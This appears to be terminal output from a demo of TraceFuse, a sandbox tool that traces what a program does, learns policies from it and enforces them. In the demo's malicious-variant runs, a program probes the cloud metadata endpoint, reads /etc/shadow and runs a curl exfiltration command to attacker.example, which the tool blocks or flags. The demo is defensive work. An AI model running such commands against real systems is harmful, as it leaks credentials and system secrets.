@@ -1,0 +1,211 @@
+go build -o bin/tracefuse ./cmd/tracefuse
+./scripts/demo.sh
+
+[1m== 1. Safe program (observe) ==[0m
+trace:    trace-acfdfb
+sandbox:  sb-a4f31e (firecracker backend, observe mode)
+duration: 6330 ms   exit: 0   timed_out: false
+
+--- stdout ---
+hello
+
+--- timeline ---
+10:13:46.144         exec            sh           /usr/local/sbin/env
+10:13:46.148         exec            sh           /usr/local/bin/env
+10:13:46.150         exec            sh           /usr/sbin/env
+10:13:46.152         exec            sh           /usr/bin/env
+10:13:46.199         exec            env          /usr/bin/python3
+10:13:46.617         file_open       python3      /tmp/.tf-agent.jsonl
+10:13:46.655         file_open       python3      /workspace/main.py
+10:13:46.658         file_open       python3      /workspace/main.py
+10:13:46.664         file_open       python3      /workspace/main.py
+10:13:46.209         exec            python3      /usr/bin/python3
+10:13:46.247         file_open       python3      /workspace/main.py
+10:13:46.250         file_open       python3      /workspace/main.py
+10:13:46.253         file_open       python3      /workspace/main.py
+10:13:46.255         process_exit    python3      exit=0
+(+73 interpreter/library file reads, 33 distinct syscalls)
+sandbox destroyed
+
+No suspicious behaviour found.
+
+Proposed policy policy-acfdfb saved (NOT approved).
+  review:  tracefuse policy show policy-acfdfb
+  approve: tracefuse policy approve policy-acfdfb
+
+[1m== 2. Useful program (observe) - learns 172.16.0.1:8080 ==[0m
+trace:    trace-cab676
+sandbox:  sb-7841dd (firecracker backend, observe mode)
+duration: 6159 ms   exit: 0   timed_out: false
+
+--- stdout ---
+[{'id': 0, 'name': 'item-0'}, {'id': 1, 'name': 'item-1'}, {'id': 2, 'name': 'item-2'}, {'id': 3, 'name': 'item-3'}, {'id': 4, 'name': 'item-4'}]
+
+--- timeline ---
+10:14:03.129         exec            sh           /usr/local/sbin/env
+10:14:03.133         exec            sh           /usr/local/bin/env
+10:14:03.134         exec            sh           /usr/sbin/env
+10:14:03.136         exec            sh           /usr/bin/env
+10:14:03.181         exec            env          /usr/bin/python3
+10:14:03.603         file_open       python3      /tmp/.tf-agent.jsonl
+10:14:03.639         file_open       python3      /workspace/main.py
+10:14:03.642         file_open       python3      /workspace/main.py
+10:14:03.648         file_open       python3      /workspace/main.py
+10:14:04.075         network_connect python3      172.16.0.1:8080
+10:14:03.203         exec            python3      /usr/bin/python3
+10:14:03.239         file_open       python3      /workspace/main.py
+10:14:03.242         file_open       python3      /workspace/main.py
+10:14:03.245         file_open       python3      /workspace/main.py
+10:14:03.670         dns             python3      172.16.0.1:8080
+10:14:03.674         network_connect python3      172.16.0.1:8080
+10:14:03.679         process_exit    python3      exit=0
+(+177 interpreter/library file reads, 41 distinct syscalls)
+sandbox destroyed
+
+--- findings (review before approving; high/critical are excluded) ---
+[MEDIUM  ] trusted_private_destination python3 -> 172.16.0.1:8080: private network range (allowlisted by operator)
+
+Proposed policy policy-cab676 saved (NOT approved).
+  review:  tracefuse policy show policy-cab676
+  approve: tracefuse policy approve policy-cab676
+
+[1m== 3. Human approves the proposal ==[0m
+Approved policy-cab676. Excluded findings were NOT added to the allowlist.
+
+[1m== 4. Useful program (enforce) - succeeds ==[0m
+trace:    trace-d00d6f
+sandbox:  sb-ee203f (firecracker backend, enforce mode)
+duration: 6732 ms   exit: 0   timed_out: false
+
+--- stdout ---
+[{'id': 0, 'name': 'item-0'}, {'id': 1, 'name': 'item-1'}, {'id': 2, 'name': 'item-2'}, {'id': 3, 'name': 'item-3'}, {'id': 4, 'name': 'item-4'}]
+
+--- timeline ---
+10:14:21.245         exec            sh           /usr/local/sbin/env
+10:14:21.251         exec            sh           /usr/local/bin/env
+10:14:21.254         exec            sh           /usr/sbin/env
+10:14:21.257         exec            sh           /usr/bin/env
+10:14:21.307         exec            env          /usr/bin/python3
+10:14:21.757         file_open       python3      /tmp/.tf-agent.jsonl
+10:14:21.761         file_open       python3      /workspace/.tracefuse/policy.json
+10:14:21.802         file_open       python3      /workspace/main.py
+10:14:21.806         file_open       python3      /workspace/main.py
+10:14:21.812         file_open       python3      /workspace/main.py
+10:14:22.274         network_connect python3      172.16.0.1:8080
+10:14:21.348         exec            python3      /usr/bin/python3
+10:14:21.393         file_open       python3      /workspace/main.py
+10:14:21.397         file_open       python3      /workspace/main.py
+10:14:21.400         file_open       python3      /workspace/main.py
+10:14:21.861         dns             python3      172.16.0.1:8080
+10:14:21.864         network_connect python3      172.16.0.1:8080
+10:14:21.871         process_exit    python3      exit=0
+(+177 interpreter/library file reads, 40 distinct syscalls)
+sandbox destroyed
+
+[1m== 5. Malicious variant under the SAME policy - blocked ==[0m
+trace:    trace-063093
+sandbox:  sb-b4d277 (firecracker backend, enforce mode)
+duration: 7647 ms   exit: 0   timed_out: false
+
+--- stdout ---
+[{'id': 0, 'name': 'item-0'}, {'id': 1, 'name': 'item-1'}, {'id': 2, 'name': 'item-2'}, {'id': 3, 'name': 'item-3'}, {'id': 4, 'name': 'item-4'}]
+metadata: <urlopen error TraceFuse blocked dns 169.254.169.254:80: baseline: cloud metadata endpoint>
+curl: TraceFuse blocked exec curl: process explicitly denied
+shadow: TraceFuse blocked file_open /etc/shadow: baseline: sensitive file
+
+--- timeline ---
+10:14:40.416         exec            sh           /usr/local/sbin/env
+10:14:40.421         exec            sh           /usr/local/bin/env
+10:14:40.423         exec            sh           /usr/sbin/env
+10:14:40.426         exec            sh           /usr/bin/env
+10:14:40.468         exec            env          /usr/bin/python3
+10:14:40.887         file_open       python3      /tmp/.tf-agent.jsonl
+10:14:40.891         file_open       python3      /workspace/.tracefuse/policy.json
+10:14:40.930         file_open       python3      /workspace/main.py
+10:14:40.934         file_open       python3      /workspace/main.py
+10:14:40.937         file_open       python3      /workspace/main.py
+10:14:41.370         network_connect python3      172.16.0.1:8080
+10:14:41.400         process_exit    python3      exit=0
+10:14:40.489         exec            python3      /usr/bin/python3
+10:14:40.529         file_open       python3      /workspace/main.py
+10:14:40.530         file_open       python3      /workspace/main.py
+10:14:40.530         file_open       python3      /workspace/main.py
+10:14:40.969         dns             python3      172.16.0.1:8080
+10:14:40.971         network_connect python3      172.16.0.1:8080
+10:14:40.985 BLOCKED dns             python3      169.254.169.254:80  reason: baseline: cloud metadata endpoint
+10:14:40.985 BLOCKED exec            curl         curl -s -m 2 https://attacker.example/exfiltrate  reason: process explicitly denied
+10:14:40.985 BLOCKED file_open       python3      /etc/shadow  reason: baseline: sensitive file
+10:14:40.985         process_exit    python3      exit=0
+(+181 interpreter/library file reads, 41 distinct syscalls)
+sandbox destroyed
+
+[1m== 6. Malicious variant (observe) - learning does not grant trust ==[0m
+trace:    trace-afca05
+sandbox:  sb-e1f00f (firecracker backend, observe mode)
+duration: 6991 ms   exit: 0   timed_out: false
+
+--- stdout ---
+[{'id': 0, 'name': 'item-0'}, {'id': 1, 'name': 'item-1'}, {'id': 2, 'name': 'item-2'}, {'id': 3, 'name': 'item-3'}, {'id': 4, 'name': 'item-4'}]
+metadata: <urlopen error TraceFuse blocked dns 169.254.169.254:80: baseline: cloud metadata endpoint>
+shadow: TraceFuse blocked file_open /etc/shadow: baseline: sensitive file
+
+--- timeline ---
+10:14:58.412         exec            sh           /usr/local/sbin/env
+10:14:58.416         exec            sh           /usr/local/bin/env
+10:14:58.418         exec            sh           /usr/sbin/env
+10:14:58.420         exec            sh           /usr/bin/env
+10:14:58.471         exec            env          /usr/bin/python3
+10:14:58.938         file_open       python3      /tmp/.tf-agent.jsonl
+10:14:58.978         file_open       python3      /workspace/main.py
+10:14:58.982         file_open       python3      /workspace/main.py
+10:14:58.988         file_open       python3      /workspace/main.py
+10:14:59.460         network_connect python3      172.16.0.1:8080
+10:14:59.491         exec            python3      /usr/bin/curl
+10:14:59.783         network_connect curl         127.0.0.53:53
+10:14:58.524         exec            python3      /usr/bin/python3
+10:14:58.565         file_open       python3      /workspace/main.py
+10:14:58.569         file_open       python3      /workspace/main.py
+10:14:58.573         file_open       python3      /workspace/main.py
+10:14:59.042         dns             python3      172.16.0.1:8080
+10:14:59.045         network_connect python3      172.16.0.1:8080
+10:14:59.056 BLOCKED dns             python3      169.254.169.254:80  reason: baseline: cloud metadata endpoint
+10:14:59.056         exec            curl         curl -s -m 2 https://attacker.example/exfiltrate
+10:14:59.360 BLOCKED file_open       python3      /etc/shadow  reason: baseline: sensitive file
+10:14:59.360         process_exit    python3      exit=0
+(+229 interpreter/library file reads, 48 distinct syscalls)
+sandbox destroyed
+
+--- findings (review before approving; high/critical are excluded) ---
+[MEDIUM  ] trusted_private_destination python3 -> 172.16.0.1:8080: private network range (allowlisted by operator)
+[HIGH    ] shell_or_network_tool  spawned curl ()
+[CRITICAL] sensitive_file         curl opened /root/.curlrc
+[LOW     ] local_destination      curl -> 127.0.0.53:53: loopback (local dev only)
+[HIGH    ] blocked                dns by python3 (169.254.169.254:80): baseline: cloud metadata endpoint
+[HIGH    ] shell_or_network_tool  spawned curl (curl -s -m 2 https://attacker.example/exfiltrate)
+[HIGH    ] blocked                file_open by python3 (/etc/shadow): baseline: sensitive file
+
+Proposed policy policy-afca05 saved (NOT approved).
+  review:  tracefuse policy show policy-afca05
+  approve: tracefuse policy approve policy-afca05
+
+[1m== 7. Behavioural diff ==[0m
+Version A (trace-cab676):
+  - 132 files read
+  - 1 network destinations
+  - 2 processes
+  - 0 blocked actions
+  - 6159 ms
+Version B (trace-afca05):
+  - 171 files read
+  - 2 network destinations
+  - 3 processes
+  - 2 blocked actions
+  - 6991 ms
+
+Behavioural regression detected:
+  +39 file reads
+  +1 network destinations
+  +1 processes
+  +2 blocked actions
+  + destination 127.0.0.53:53
+  + process curl
